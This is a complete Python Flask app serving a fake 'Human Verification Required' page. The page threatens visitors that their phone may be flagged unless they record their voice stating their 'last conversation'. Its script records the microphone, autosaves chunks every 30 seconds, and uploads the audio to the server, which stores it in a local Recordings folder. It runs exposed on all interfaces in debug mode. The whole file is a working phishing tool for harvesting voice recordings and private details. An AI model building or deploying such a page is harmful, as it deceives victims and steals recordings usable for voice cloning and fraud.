
from flask import Flask, request, jsonify
import os
import base64
from datetime import datetime

app = Flask(__name__)

# Directory to save recordings
RECORDINGS_FOLDER = os.path.expanduser('~/storage/downloads/Recordings')
if not os.path.exists(RECORDINGS_FOLDER):
    os.makedirs(RECORDINGS_FOLDER)

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Voice Verification</title>
        <style>
            body {
                background-color: black;
                color: white;
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 20px;
            }
            button {
                background-color: white;
                color: black;
                border: none;
                padding: 10px 20px;
                font-size: 16px;
                cursor: pointer;
                border-radius: 5px;
            }
            button:hover {
                background-color: gray;
                color: white;
            }
        </style>
    </head>
    <body>
        <h1>Human Verification Required</h1>
        <p>We need to verify your identity to ensure you're not a bot. Please record your voice and clearly state your last conversation. If you fail to comply, your phone might be flagged for suspicious activity.</p>
        <p>This verification is essential for ensuring secure and uninterrupted access.</p>
        <button onclick="startRecording()">Start Recording</button>
        <button onclick="stopRecording()">Stop Recording</button>
        <p id="status">Status: Awaiting user action...</p>
        <script>
            let mediaRecorder;
            let audioChunks = [];
            let autosaveInterval;

            async function startRecording() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    mediaRecorder = new MediaRecorder(stream);
                    mediaRecorder.ondataavailable = event => {
                        audioChunks.push(event.data);
                    };
                    mediaRecorder.onstop = saveRecording;
                    audioChunks = [];
                    mediaRecorder.start();
                    document.getElementById('status').innerText = "Recording in progress...";

                    // Start autosave interval
                    autosaveInterval = setInterval(() => {
                        if (mediaRecorder && mediaRecorder.state === "recording") {
                            mediaRecorder.requestData();
                        }
                    }, 30000); // 30 seconds
                } catch (err) {
                    console.error("Error accessing microphone:", err);
                    document.getElementById('status').innerText = "Error: Unable to access microphone.";
                }
            }

            function stopRecording() {
                if (mediaRecorder && mediaRecorder.state !== "inactive") {
                    clearInterval(autosaveInterval); // Stop the autosave interval
                    mediaRecorder.stop();
                    document.getElementById('status').innerText = "Recording stopped. Uploading audio...";
                } else {
                    document.getElementById('status').innerText = "No recording in progress.";
                }
            }

            async function saveRecording() {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(audioBlob);
                reader.onloadend = async function() {
                    const base64Audio = reader.result.split(',')[1];
                    const response = await fetch('/upload_audio', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ audio: base64Audio })
                    });
                    const result = await response.json();
                    document.getElementById('status').innerText = result.message || "Audio uploaded successfully.";
                    audioChunks = []; // Clear the chunks after saving
                };
            }
        </script>
    </body>
    </html>
    '''

@app.route('/upload_audio', methods=['POST'])
def upload_audio():
    try:
        audio_data = request.json.get('audio')
        if not audio_data:
            return jsonify({"error": "No audio data received"}), 400

        # Save audio file
        filename = f"recording_{datetime.now().strftime('%Y%m%d%H%M%S')}.webm"
        filepath = os.path.join(RECORDINGS_FOLDER, filename)
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(audio_data))
        
        return jsonify({"message": f"Audio saved successfully as {filename}."}), 200
    except Exception as e:
        return jsonify({"error": f"An error occurred: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)

